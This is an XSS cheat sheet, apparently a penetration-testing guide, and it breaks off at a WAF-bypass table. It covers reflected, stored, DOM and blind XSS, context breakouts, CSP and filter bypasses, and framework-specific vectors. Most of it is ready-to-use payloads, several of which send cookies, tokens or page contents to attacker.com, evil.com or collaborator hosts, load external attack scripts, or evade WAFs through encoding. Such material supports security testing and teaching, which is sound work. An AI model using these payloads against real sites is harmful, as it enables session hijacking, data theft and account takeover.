---
title: Cross-Site Scripting (XSS)
---

# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. It is one of the most prevalent security issues in modern web applications and can lead to serious consequences including data theft, session hijacking, malware distribution, and unauthorized actions on behalf of authenticated users.

## Types of XSS Attacks

### 1. Reflected XSS

- Malicious script is reflected from the server response without being stored
- Typically delivered via crafted URLs, phishing emails, or malicious links
- Requires user interaction (clicking link, submitting form)
- Affects only users who access the malicious URL.

Example:

```
https://example.com/search?q=><script>alert(1)</script>
```

### 2. Stored XSS

- Malicious script is permanently stored on the server (database, file system, logs)
- Automatically executed when users access the affected page
- Affects all users who view the compromised content.
- Most dangerous type as it requires no social engineering.

Example:

```
<https://example.com/search?q=><img src=x onerror=alert(document.cookie)>
```

### 3. DOM-Based XSS

- Vulnerability exists entirely in client-side JavaScript.
- Attack payload is executed during DOM manipulation.
- Server response remains unchanged; attack happens in browser.
- Sources (input) flow to sinks (output) without proper sanitization.

Vulnerable JavaScript Code:

```jsx
document.write(location.hash.substring(1));
```

Exploit URL:

```
https://test.com/#><script>alert(1)</script>
```

### Sources:

- **Sources** are where user-controllable input enters the JavaScript environment.

**Common Sources (User Input):**

- `location.hash` - URL fragment after #
- `location.search` - Query parameters
- `document.referrer` - Referrer URL
- `window.name` - Window name property
- `document.cookie` - Cookies
- `localStorage`/`sessionStorage` - Web storage

### Sinks:

- **Sinks** are dangerous JavaScript functions/properties that execute or render content.

**Common Sinks (Dangerous Functions):**

- `element.innerHTML` / `element.outerHTML` - HTML rendering
- `document.write()` / `document.writeln()` - Direct document writing
- `eval()` / `Function()` - Code execution
- `setTimeout()` / `setInterval()` (with string arguments) - Dynamic execution
- `location` / `location.href` - URL navigation
- `element.onclick` / `element.onerror` - Event handlers

### Examples:

```jsx
// Example 1: innerHTML sink
var name = location.search.split('name=')[1];
document.getElementById('output').innerHTML = name;
// Payload: ?name=<img src=x onerror=alert(1)>

// Example 2: eval() sink
var code = location.hash.substring(1);
eval(code);
// Payload: #alert(document.cookie)

// Example 3: location.href sink
var redirect = new URLSearchParams(location.search).get('url');
location.href = redirect;
// Payload: ?url=javascript:alert(1)
```

---

## Common XSS Vectors:

### User Input Injection Points

**Search Bars** - User input appears in search results page

```html
Payload: <script>alert(1)</script>

What happens: You search for "test" and see "Results for: test"
Attack: Replace "test" with XSS payload

```

**Comment Sections** - Your comment gets displayed to other users

```html
Payload: <img src=x onerror=alert(1)>

What happens: Your comment shows on the page for everyone
Attack: When others view page, your payload executes
```

**Contact Forms** - Admin views form submissions in backend

```html
Payload: <script>fetch('<http://attacker.com/steal?data='+document.cookie>)</script>

What happens: Admin sees your contact form message in admin panel
Attack: Steal admin cookies when they view your submission
```

**Profile Fields** - Your profile info displays to other users

```html
Payload: " onmouseover=alert(1) class="

What happens: Your bio appears as <div class="bio " onmouseover=alert(1) class="">
Attack: Anyone hovering over your profile triggers the payload
```

**URL Parameters** - Parameters reflected in page content

```html
URL: <https://site.com/page?message=Welcome>

Attack: <https://site.com/page?message=><script>alert(1)</script>
What happens: Page displays "Welcome" → becomes XSS execution
```

**File Upload Forms** - Upload malicious HTML/SVG files

```html
SVG Payload: <svg onload=alert(1)>     // store in a svg file

What happens: You upload profile picture as SVG file
Attack: When page displays your "image", code executes
```

**Login Forms** - Error messages reflect user input

```html
Username: <script>alert(1)</script>

What happens: Error shows "User <script>alert(1)</script> not found"
Attack: Error message becomes XSS vector
```

**HTTP Headers** - Some headers reflected in page

```html
User-Agent: <script>alert(1)</script>
Referer: <https://site.com/><script>alert(1)</script>

What happens: Server reflects headers in page content and XSS payload executes
```

---

## **Testing for XSS :**

### **1. Manual Fuzzing**

- Inject common + advanced payloads (`"><script>alert(1)</script>`, event handlers, HTML breaks, JS URIs).
- Test all input sinks: parameters, headers, cookies, hidden fields, JSON bodies.
- Try both reflected & stored flows; observe DOM changes using DevTools.

### **2. Automated Scanners**

- Use Burp Suite Active Scan, ZAP, or XSpear to detect reflections, DOM sinks, and dangerous contexts.
- Combine with Intruder/ fuzz lists for wide payload coverage.
- Always validate scanner findings manually (false positives are common).

### **3. Code Review**

- Identify unsafe sinks: `innerHTML`, `document.write`, jQuery `.html()`, Vue/React dynamic bindings, template engines.
- Track untrusted data flow to DOM APIs.
- Check server-side sanitization/encoding logic & CSP configuration.

### **4. Realistic Attack Simulations**

- Craft payloads that steal cookies, tokens, keystrokes, or perform CSRF actions.
- Test bypasses: encoding, obfuscation, WAF evasion, CSP gaps.
- Validate exploitation chain: XSS → CSRF → account takeover / data exfiltration.

---

## Basic XSS Contexts & Breakouts

### HTML Context:

Use when your input appears directly in the page HTML body:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Attribute Context

Use when your input is reflected inside HTML tag attributes - Break out of the attribute first

Payloads:

```html
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="
' onclick=alert(1) x='
```

**Href attribute:**

- For href attributes specifically, use javascript protocol:

```html
<a href="javascript:alert(1)">Click</a>
```

### JavaScript Context

Use when your input appears inside existing JavaScript code - break out of strings:

```html
';alert(1);//
';alert(1)//
</script><script>alert(1)</script>
```

When inside template literals (backticks), use interpolation:

```html
${alert(1)}
`${alert(1)}`
'+alert(1)+'
"+alert(1)+"
```

### URL Context

Use when input is used in navigation URLs - prefix with javascript protocol:

```jsx
javascript:alert(1)
jaVaScRipt:alert(1)        // Mixed case for filter bypass
javascript:confirm(document.cookie)
```

### Event Handlers

Use when you can inject into HTML event attributes - no script tags needed:

```jsx
onclick=alert(1)
onmouseover=alert(1)
onload=alert(1)
onerror=alert(1)
onfocus=alert(1)
```

---

## **Blind XSS**

- Blind XSS occurs when a malicious script gets stored and later executed **in a different environment** than where the attacker injected it - typically on **internal dashboards, logs, or review panels** that the attacker cannot see.
- Execution happens when **any user or system process** with access to that backend interface loads the malicious data.
- While this often includes **admins or support staff**, it can also affect **moderators, analysts, automated log viewers, or any internal role** that processes the stored input.

### **Key Characteristics**

- Execution is *delayed* (not immediate).
- Injection point is *hidden* from the attacker.
- Requires **OAST** (out-of-band techniques) for detection.
- Can impact **any internal or higher-privileged user/process**, not only admins - leading to data theft or full system compromise.

---

## **Detecting Blind XSS**

Blind XSS requires out-of-band callbacks via tools such as:

- **XSS Hunter**
- **XSS Hunter Express**
- **Burp Collaborator**
- **Interactsh**

**Common injection points:**

- Feedback/contact forms
- Analytics parameters (utm_*)
- Request headers (User-Agent, Referer, X-Forwarded-For)
- Blog/help search boxes
- Error messages / logs
- Order invoices, billing name, address

> **Always keep your OAST endpoint running because execution time is unpredictable.**
> 

---

## **Exploiting Blind XSS**

Since you cannot see the execution, exploitation requires **JavaScript spyware** that:

- Sends callbacks containing user data
- Steals cookies, tokens, DOM content
- Monitors victim activity
- Performs CSRF or actions on behalf of the user

Typically achieved by loading an external malicious JS file:

```html
"><script src="https://your-oast.com/script.js"></script>
```

---

## **Blind XSS Payloads**

### **1. Image-only (HTML Injection Check)**

Used when you only want to confirm HTML rendering in an internal panel without executing JS. It triggers a simple image request to your server.

```html
'"><img src="https://example.burpcollaborator.net/image">
```

---

### **2. Image-tag Blind XSS**

Used when script tags are blocked but event handlers work; the broken image executes JS internally. It sends location or page content to your OAST server.

```html
'"><img src="https://example.burpcollaborator.net/image-only" onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='this.src="https://"+btoa(document.location)+".example.burpcollaborator.net/image-dns?"'>

'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='fetch("https://example.burpcollaborator.net/image-xss-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
```

---

### **3. DNS-based Blind XSS**

Used when only DNS resolution is allowed outbound; the payload exfiltrates data through a DNS lookup. Ideal for highly restricted internal networks.

```html
'"><img src=x onerror='this.src="https://"+btoa(document.location)+".example.burpcollaborator.net/image-dns?"'>
```

---

### **4. iframe-based Blind XSS**

Used when iframes are allowed; the iframe loads JavaScript internally and sends data to your server. Useful when `script` and `img` tags are filtered.

```html
'"><iframe src='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></iframe>

'"><iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>

'"><iframe srcdoc='<script>fetch("https://example.burpcollaborator.net/iframe-srcdoc-post",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
```

---

### **5. Object-tag Blind XSS**

Used when `<object>` elements are allowed while scripts are sanitized; it loads JavaScript via the data attribute. Works in older admin dashboards.

```html
'"><object data='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></object>
```

---

### **6. Input-field Blind XSS**

Used when your payload ends up inside an input field viewed by an internal user. The `onfocus` event fires automatically if autofocus is permitted.

```html
<input autofocus onfocus='fetch("https://example.burpcollaborator.net/input-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
```

---

### **7. Script-tag Callbacks**

Used when external scripts are allowed but inline JS isn’t; the script loads from your server and executes automatically. Good for admin-panel triggers.

```html
'"><script src=https://example.burpcollaborator.net/script-tag></script>

'"><script type="text/javascript" src="https://example.burpcollaborator.net/script-tag-type"></script>

'"><script type="module" src="https://example.burpcollaborator.net/script-tag-module"></script>

'"><script nomodule src="https://example.burpcollaborator.net/script-tag-nomodule"></script>
```

---

### **8. JavaScript URI Scheme**

Used when links or URL fields are rendered as clickable anchors; clicking the link executes JS in the admin’s browser.

```jsx
javascript:window.location="https://example.burpcollaborator.net/js-scheme?"+btoa(document.location)

javascript:fetch("https://example.burpcollaborator.net/js-scheme-fetch?"+btoa(document.location))
```

---

### **9. Advanced SVG Blind XSS**

Used when HTML sanitization removes normal tags but SVG is still accepted. Encoded payloads execute through the `onload` inside SVG.

```html
'"><svg id="ZWNobyAnWFNTJw==" onload="eval(atob(this.id))"></svg>

```

---

## Modern Attack Surfaces

### **1. Single Page Applications (SPAs)**

SPAs often manipulate the DOM dynamically, making them vulnerable when hash fragments (`#`) or client-side routing are not sanitized.

```jsx
https://app.example.com/#/dashboard/><img src=x onerror=alert(1)>
```

Common SPA pitfalls:

- Angular/React/Vue bypass via template injection
- Client-side routers interpreting payloads as routes
- Unsafe `innerHTML` usage

### **2. WebSockets**

WebSockets transmit raw data. If the server reflects messages back to clients or stores them, they can trigger XSS.

```jsx
// Cookie Exfiltration
ws.send('<img src=x onerror="fetch(`https://evil.com/?c=${document.cookie}`)">');
```

Attack scenarios:

- Chat applications
- Real-time dashboards
- Collaborative editors

### **3. Server-Side Rendering (SSR)**

SSR frameworks (Next.js, Nuxt, Remix) render HTML on the server. If unsanitized input is embedded, XSS becomes stored or reflected.

```jsx
const userInput = `${unsafe}`; // inserted into SSR HTML output
```

Dangerous SSR patterns:

- Direct variable interpolation into templates
- Using `dangerouslySetInnerHTML` incorrectly
- Custom template engines without escaping

### **4. GraphQL**

GraphQL endpoints accept nested fields and long queries. If the server injects query values into HTML (e.g., templates, logs, UI panels), it may execute script.

```graphql
{
  search(query: "<script>alert(1)</script>") {
    results
  }
}
```

Common issues:

- GraphiQL / Playground reflecting user queries
- Error messages rendering raw input
- HTML reports/debug tools showing unescaped fields

### **5. Web Components**

Shadow DOM misuse often leads to DOM-based XSS when user HTML is injected into custom components.

```jsx
element.attachShadow({ mode: 'open' }).innerHTML = userInput;
```

Risky patterns:

- Custom elements using `.innerHTML`
- Passing user-controlled HTML through attributes
- Template cloning without sanitization

### **6. PDF Generators**

Many PDF engines support HTML → PDF conversion. Injecting HTML/JS can produce XSS when:

- PDF is rendered in-browser
- Viewer allows JS execution
- Dynamic PDF templates include user data

Example payload:

```html
<script>alert("XSS in PDF")</script>
```

Other vectors:

- Malicious `<img>` with JS inside URI
- Injected JS in annotations
- Embedded forms executing JavaScript

### **7. `postMessage` Attacks**

Vulnerabilities occur when a site receives a `message` event but **fails to validate the origin** or **dangerously inserts the message into the DOM**.

**Example payload sent from attacker iframe/window:**

```jsx
window.postMessage('<img src=x onerror=alert(1)>', '*');
```

**Vulnerable receiver code:**

```jsx
window.addEventListener('message', (e) => {
    // No origin check + using innerHTML = XSS
    document.getElementById("output").innerHTML = e.data;
});
```

---

## Bypassing Modern Defenses

### **Filter Evasion**

Techniques used to bypass naive filters, case checks, encoding checks, and signature-based WAF rules.

```jsx
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
</script><img src=x onerror=alert(1)>
```

**HTML Entity Encoding**

```jsx
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

**Double / Over-Encoded Payloads**

```jsx
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
```

**JavaScript URI schemes**

```jsx
javascript:alert(1)
jAvAsCrIpT:alert(1)
```

**Bypassing Tag Filtering**

```jsx
<iframe/src=javascript:alert(1)>
<svg><script>alert(1)</script>
<math><mi><script>alert(1)</script>
```

**Attribute Injection**

```jsx
"><img src=x onerror=alert(1)>
' autofocus onfocus=alert(1) //
```

---

## **CSP Bypass Techniques**

Below are the CSP misconfigurations and their corresponding bypass payloads, presented in the same style and format..

### **1. Inline JavaScript Allowed (`unsafe-inline`)**

**Policy:**

```
Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline';
```

This configuration explicitly permits **inline JavaScript**, meaning any reflected/stored XSS will execute immediately.

**Payload:**

```html
<script>alert(1)</script>
```

When `unsafe-inline` is enabled, **all inline `<script>` tags, event handlers, and JavaScript URLs execute normally**, defeating CSP.

---

### **2. Dangerous `unsafe-eval` Enabled**

**Policy:**

```visual-basic
Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' data:;
```

Here:

- `unsafe-eval` allows `eval()`, `Function()`, `setTimeout("…")`, etc.
- `data:` allows scripts loaded from Base64-encoded URLs.

**Bypass payload:**

```html
<script src="data:;base64,YWxlcnQoMSk="></script>
```

If `data:` was not permitted, this would fail - but a DOM XSS using `eval(evil_input)` would still work.

---

### **3. Wildcard in `script-src`**

**Policy:**

```
Content-Security-Policy: default-src 'none'; script-src https://example.com *;
```

The wildcard `*` overrides the domain restriction, allowing scripts from **any external host**.

**Bypass payloads:**

```html
<script src="https://evil.example.net/pwn.js"></script>
```

Or using Base64 if `data:` is also allowed:

```html
<script src="data:;base64,YWxlcnQoMSk="></script>
```

Any attacker-controlled server becomes a valid script source.

---

### **4. Missing `object-src` and `default-src`**

**Policy:**

```
Content-Security-Policy: script-src 'self'; img-src 'self';
```

Without `object-src`:

- `<object>` can load arbitrary HTML.
- Base64 HTML inside `<object>` executes JavaScript.

**Bypass payload:**

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

This works because `<object>` is unrestricted.

---

### **5. JSONP Endpoint Allowed in `script-src`**

**Policy:**

```
Content-Security-Policy: default-src 'none';
script-src https://hello.example.com/test.js https://accounts.google.com/o/oauth2/revoke;
```

JSONP endpoints return executable JavaScript using callback parameters.

**Bypass request:**

```
https://accounts.google.com/o/oauth2/revoke?callback=alert(1)
```

**Bypass payload:**

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

The remote server returns `alert(1)` which executes due to JSONP behavior.

---

### **6. CSP Bypass Using File Upload Functionality**

**Policy:**

```
Content-Security-Policy: default-src 'self';
```

Even though `'self'` is strict, an app feature may allow uploading:

- `.js`
- `.html`
- or disguised text files

If the file is served from the same origin, it becomes a trusted script source.

**Bypass payload:**

Upload:

```
evil-script.js → contains alert(1)
```

Then reference:

```html
<script src="/uploads/evil-script.js"></script>
```

This bypasses CSP entirely because the uploaded file is now same-origin.

---

### **7. Bypassing CSP in AngularJS**

- Certain AngularJS versions (especially 1.0.x–1.2.x) allow execution through Expressions even when CSP mode is enabled.
- If the application loads AngularJS from an allowed domain, CSP can be bypassed via `ng-click` + `$event.view`.

**Bypass payload:**

```html
ng-app ng-csp ng-click=$event.view.alert('payatu')>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
```

When clicked, it triggers JavaScript execution **without needing `<script>` tags**.

---

### **8. Bypass via Open Redirect in Whitelisted Domain**

**Policy:**

```
Content-Security-Policy: script-src 'self' example.com/random/ website-with-redirect.com; object-src 'none';
```

If a whitelisted domain contains an **open redirect**, the attacker can make the browser fetch **arbitrary JS** through it.

**Bypass payload:**

```html
"><script src="https://<website-with-redirect>.com/redirect?url=https%3A//example.com/o/revoke?callback=alert('payatu')"></script>

```

The redirect points to a JSONP endpoint → callback executes → CSP bypassed.

---

### **9. Encoding `/` to Bypass Directory-Restricted CSP**

**Policy:**

```
Content-Security-Policy: script-src https://<abc>.com/safe/
```

If CSP restricts script loading to a specific directory:

- Browsers normalize `%2f` into `/`
- Server may accept traversal sequences like `%2f..%2f`
- Attacker can break out of the directory

**Bypass payload:**

```html
<script src="https://<abc>.com/safe%2f..%2funsafe/evil.js"></script>
```

This loads the script from an **unintended, unsafe directory** while still matching the CSP rule syntactically.

---

### **10. CSP Bypass Using Open Redirect + JSONP (Chained Attack)**

This one is implied in Type 5 but more specifically a **two-stage bypass**:

1. Use a whitelisted open redirector
2. Redirect to a JSONP endpoint on another whitelisted domain

**Example chain:**

```
whitelisted-redirect.com → redirects to → google.com/revoke?callback=alert(1)
```

This results in CSP mistakenly allowing external script execution.

**Bypass payload:**

```html
<script src="https://whitelisted-redirect.com/r?url=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

---

## **Event Handler Bypass**

When `<script>` is filtered, event attributes still allow JavaScript execution.

```jsx
<div onmouseover="alert(1)">Hover</div>
<img src=x onerror="alert(1)">
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>
```

**Less Common Event Vectors**

```jsx
<a href="#" onclick="alert(1)">Click</a>
<form onsubmit="alert(1)">
<video onloadeddata="alert(1)">
<select onchange="alert(1)">
```

**SVG-Based XSS**

```jsx
<svg onload=alert(1)>
<svg><a href="#" onclick=alert(1)>X</a></svg>
```

**JS Obfuscation / Evaluation**

```jsx
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

**Property Access Bypasses**

```jsx
<img src=x onerror=window>
<img src=x onerror=top>
```

**Using arrow functions & template strings**

```jsx
<img src=x onerror="(()=>alert(1))()">
<img src=x onerror="alert`${1}`">
```

**Bypassing keyword filters**

```jsx
<img src=x onerror=Function('al'+'ert(1)')()>
<img src=x onerror=`al${'ert'}`(1)>
```

---

## Advanced XSS Scenarios

### 1. PhantomJS HTML Injection → XSS → SSRF/LFR

PhantomJS renders attacker-controlled HTML inside a `file://` context, so any parameter that accepts HTML (e.g., `header=`) becomes an XSS sink. Since PhantomJS uses `document.write()` and loads external resources, XSS quickly escalates into SSRF and then Local File Read.

**How the Chain Works**

- **1. HTML Injection → XSS:**
    
    Inject `<img src=x onerror=...>` or `<script>` inside headers/HTML rendered by PhantomJS.
    
- **2. XSS → SSRF:**
    
    Use injected JS to load URLs from internal network:
    
    `new Image().src="http://127.0.0.1:8080/admin";`
    
- **3. SSRF → Local File Read:**
    
    PhantomJS fetches `file://` paths, so attacker forces it to request:
    
    `file:///etc/passwd` or other local files (PhantomJS returns raw content).
    
- **4. Data Exfil:**
    
    Steal file contents using DNS, fetch, `<img src>`, or error-based leaks.
    

**Why It Works**

- PhantomJS treats provided HTML as trusted.
- Allows synchronous external loads + `file://` access.
- No sandbox → complete local file exposure.

**What to Test**

- Any HTML-rendered parameter (`header`, `footer`, `template`, `note`).
- Check if PhantomJS is used internally (HTML-to-PDF services).
- Try both `<script>` and event-handler XSS payloads.

### **2. CSRF + XSS Chaining**

### **Core Idea:**

- **XSS → execute JS**
- **CSRF → trigger victim’s authenticated actions**
- **Chain → attacker plants XSS using victim’s own session**

### **Chaining Logic :**

### **1. Use XSS to run malicious JS**

- Extract data (cookie, keystrokes, tokens)
- Or inject malicious HTML via browser APIs
- If CSP is restrictive, fall back to `<img src>`based signals

### **2. Use CSRF to submit authenticated requests**

- HTML form auto-submit to a protected endpoint
- Browser sends session cookies automatically

### **3. Use CSRF to plant XSS into a stored field**

- CSRF submits a request containing HTML/JS into a parameter
- Server stores this content
- When user/admin views it, XSS triggers

### **4. Resulting chain**

**CSRF stores XSS → Stored XSS executes → Exfiltration or Account Takeover**

### 3. Bypass HttpOnly → XSS Escalation

**Always analyze the local storage of application**

- Once found an xss , or reflection and if the document.cookie do not reveals the cookie because of HttpOnly flag
- Inspect the app. —>Application—> Check the local storage —> check if any credentials / JWT or PII is present by the mistake of developer
- If JWT is present ,
- localStorage.jwtToken
- Use this in xss payload 
<script>alert(localStorage.jwtToken)</script>

### **4. XSS in Chatbot Message Renderer**

### **Summary**

A chatbot UI was reflecting user input directly into the DOM **without sanitization**, causing **HTML Injection → XSS** whenever a user sent HTML/JS content.

### **Root Cause**

- Chatbot accepted user messages as **raw HTML**
- Client-side renderer directly injected content into DOM (e.g., `innerHTML`)
- No filtering/escaping → user-controlled HTML executed

### **How Vulnerability Was Found**

1. Subdomain enumeration found a **support chatbot**.
2. Tester sent `<u>test</u>` → **HTML rendered** → confirmed HTML injection.
3. Tried a basic XSS payload → **executed** inside chatbot window.

### **Payload :**

<img src=x onerror=alert(1)>

### **Impact**

- Executes in victim's browser context
- Access to **cookies, session tokens, localStorage**
- Potential **account takeover**, **chat takeover**, or **internal tool hijacking**

### **Exploit Flow**

User input → Chatbot DOM renderer → HTML interpreted → JS executes → Attacker gains browser-level privileges

### **5. Stored XSS in GitLab User Profile**

- Summary
GitLab had a Stored XSS vulnerability in the **Full Name** field of the user profile. Attackers could store JavaScript inside this field, and the payload executed whenever an **admin viewed the profile**, leading to high-impact account compromise.

### **Root Cause**

- **Improper sanitization** of the “Full Name” field
- HTML/JS was stored in DB → rendered unsafely in profile pages
- Admin panel displayed this field directly → script executed in **admin context**

### **Injection Point**

- **Location:** `Profile → Full Name`
- **Behavior:** Stored as-is → rendered with HTML interpretation
- **Typical payloads:**
    - `<img src=x onerror=alert(1)>`
    - `<script>alert(1)</script>`

### **Exploit Flow:**

### **1. Attacker edits profile**

`Full Name = <img src=x onerror=alert(document.cookie)>`

### **2. Server stores payload in DB**

Stored XSS → persistent until manually removed.

### **3. Admin opens attacker’s profile**

Admin page loads the malicious Full Name value.

### **4. Script executes in admin’s browser**

Runs with **admin privileges + admin cookies**.

### **5. Attacker gains control**

- Steals admin session
- Performs admin actions
- Modifies settings / adds users
- Extracts sensitive data

### **It’s of High Impact**

Stored XSS + Admin execution = **full administrative takeover**.

### **Potential Payloads**

- **Cookie theft**
<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>
- **Auto-admin action**
<script>
  fetch('/admin/users/add', {method:'POST',credentials:'include'});
</script>
- **Silent redirect**
<script>location='https://attacker.com/steal?c='+document.cookie</script>

## Framework-Specific Vectors

### 1. Vue.js

- Vue.js is a popular JavaScript frontend framework used for building interactive UI components. It stores internal rendering data inside JavaScript objects, which makes it sensitive to prototype manipulation.

### **Vue.js – Prototype Pollution → XSS (CVE-2024-6783)**

- CVE-2024-6783 is an **XSS vulnerability caused by prototype pollution inside Vue.js rendering internals**.If an attacker can inject a polluted property (like `staticClass` or `staticStyle`) into **Object.prototype**, Vue will unintentionally use the attacker-controlled value while rendering components, resulting in **automatic execution of attacker-controlled JavaScript**.

### Flow of Attack :

1. **Application accepts user-controlled JSON** without sanitizing keys.
2. The attacker sends JSON containing `"__proto__"` — this causes **prototype pollution**.
3. Polluted properties like `staticClass` or `staticStyle` get added to **Object.prototype**.
4. Vue.js uses these properties during component rendering.
5. The value injected here contains JavaScript code (usually via `constructor.constructor(...)`).
6. When Vue renders any component afterward, the polluted property is processed → **XSS executes automatically**.

{
"**proto**": {
"staticClass": "{constructor.constructor('alert(\"XSS via Vue pollution\")')()}"
}
}

### **Payloads :**

- {{_Vue.h.constructor`alert(1)`()}}
- {{$emit.constructor`alert(1)`()}}
- {{constructor.constructor(’alert(1)’)()}
- {{_Vue.h.constructor('x','console.log("HI this is sid0krypt")')(this)}}
- {{_Vue.h.constructor('x','console.log(x)')(this)}}

### 2. AngularJS

- AngularJS is a frontend framework using template expressions. Early versions (especially ≤1.6) allowed **sandbox escapes** leading to XSS.

### **AngularJS – Expression Sandbox Escape**

- AngularJS evaluates `{{ }}` expressions in templates.
- Older versions had **sandbox bypasses**, allowing attackers to access `Function` constructors and execute arbitrary JavaScript.

### **Flow of Attack :**

1. App reflects untrusted data inside `ng-app`, `ng-bind`, or templates.
2. Angular parses the attacker’s expression.
3. Expression escapes Angular’s sandbox via known gadget chains.
4. Attacker gains access to the JS function constructor.
5. Payload executes as JavaScript → **XSS**.

### **Payload :**

- {{ constructor.constructor('alert(1)')() }}
- {{ (''.sub.constructor('alert(1)'))() }}
- {{ toString.constructor('alert(1)')() }}

### 3. React

- React is a UI library using a virtual DOM. It **does not evaluate strings as HTML by default**, but XSS occurs when unsafe APIs or dangerous props are used.

### **React – Dangerous HTML Rendering**

- React protects against XSS unless developers use:
    - **`dangerouslySetInnerHTML`**
    - **Uncontrolled DOM insertion**
    - **User-controlled JSX attributes**

### **Flow of Attack :**

1. Application inserts user-controlled HTML or props into JSX unsafely.
2. React passes the string to the browser without sanitization.
3. Browser interprets HTML tags or event handlers.
4. Embedded JS inside attributes (`onerror`, `onclick`, etc.) executes → **XSS**.

### **Payloads :**

- ReactDOM.render(<img src="x" onerror="alert(1)" />, mountNode)
- <div dangerouslySetInnerHTML={{ __html: '<img src=x onerror=alert(1)>' }} />
- ReactDOM.render(<img src=x onerror=alert(1) />, document.body);

### 4. jQuery

- **jQuery** is a widely used JavaScript library for DOM manipulation.
- Older versions (< **3.5.0**) contained vulnerabilities where **unsafe HTML insertion** and **prototype pollution** allowed attacker-controlled HTML/JS to be executed inside the DOM.

### **jQuery – XSS via Improper HTML Handling(CVE-2020-7656)**

- jQuery incorrectly handled HTML when using functions like `.html()`, `.append()`, `.before()`, `.after()` etc., allowing attacker-controlled HTML to be parsed as executable script.

### **Flow of Attack :**

1. Application inserts untrusted HTML into `.html()` / `.append()`.
2. jQuery parses the HTML and constructs DOM elements.
3. `<script>` tags and `onerror=` handlers inside the HTML are executed.
4. Any user visiting the page runs the injected JS → XSS.

### **Payload :**

- <body>.append("<img src='x' onerror='alert(1)'>")

### **XSS via Prototype Pollution**(CVE-2019-11358)

- **CVE-2019-11358** — jQuery’s `$.extend(true, …)` could be abused for **prototype pollution**, enabling attackers to plant polluted properties on `Object.prototype`. These values were later used inside DOM updates → **XSS**.

### **Flow of Attack :**

1. App accepts attacker-controlled JSON/params.
2. Unsafe merge via `$.extend(true, target, source)` processes `"__proto__"` keys.
3. Attacker pollutes `Object.prototype.propertyName`.
4. Later jQuery calls (like `.html(config.safeLink)`) use polluted properties.
5. Polluted value contains attacker-controlled HTML → XSS.

### **Payloads :**

- $('div').html('<img src=x onerror=alert(1)>');
- <svg onload='alert(1)'>

### 5. Django

- Django is a Python web framework using Jinja-like templating.
- Django auto-escapes output, but developers can disable escaping using filters like `|safe`.

### **Django – Unsafe Template Rendering**

- XSS happens when developers use **`safe`**, **`mark_safe`**, or disable autoescaping.
- This directly injects user HTML into the page.

### **Flow of Attack :**

1. User-controlled value is passed into a template.
2. Developer marks it as **safe**, disabling Django’s escaping.
3. Browser receives raw HTML.
4. Browser executes tags or JS inside attributes → **XSS**.

### **Payloads :**

- {{ value|safe }}
- {{ user_input|safe }}
- {{ mark_safe(user_input) }}

---

## Encoding and Obfuscation

### **Encoding**

“Attackers encode payload characters (hex, URL, Unicode, Base64) so the malicious script is hidden during input filtering, hoping the browser will decode it later and execute it.”

### **Obfuscation**

“Attackers rearrange, split, or mask parts of the script (comments, whitespace, case changes, string concatenation) to trick WAFs and filters that look for direct keywords like `<script>` or `alert`.”

| **Technique** | **Obfuscated**  | **Original Payload**  | **Purpose** |
| --- | --- | --- | --- |
| **Hex Encoding** | `\\x61\\x6c\\x65\\x72\\x74(1)` | `alert(1)` → `alert(1)` as text | Hide chars in hex |
| **Unicode Encoding** | `\\u0061\\u006c\\u0065\\u0072\\u0074(1)` | `alert(1)` | Bypass Unicode filters |
| **Octal Encoding** | `\\141\\154\\145\\162\\164(1)` | `alert(1)` | Alternate numeric encoding |
| **HTML Entities** | `&#97;&#108;&#101;&#114;&#116;(1)` | `alert(1)` | Evade HTML parsing |
| **Base64 Encoding** | `YWxlcnQoMSk=` *(decoded with atob)* | `alert(1)` | Hide full payload |
| **String Concatenation** | `'ale'+'rt'(1)` | `alert(1)` | Break keyword match |
| **Template Literals** | `alert\`1\`` | `alert(1)` | Use JS backticks |
| **Character Codes** | `String.fromCharCode(97,108,...)` | `alert(1)` | Dynamic code building |
| **Whitespace / Newline** | `java\nscript:alert(1)` *(escaped)* | `javascript:alert(1)` | Break scheme detection |
| **URL Encoding** | `%61%6c%65%72%74(1)` | `alert(1)` | Escape characters in URLs |
| **Comment Injection** | `a/**/lert(1)` | `alert(1)` | Split malicious keywords |
| **Alternative Execution** | `setTimeout('alert(1)')` *(escaped)* | `alert(1)` | Indirect JS execution |
| **Mixed Techniques** | Base64 + hex + split forms | `alert(1)` | Evade multi-layer filters |

## **WAF Bypasses Techniques**

| **Technique** | **Example** | **Purpose**  |
| --- | --- | --- |
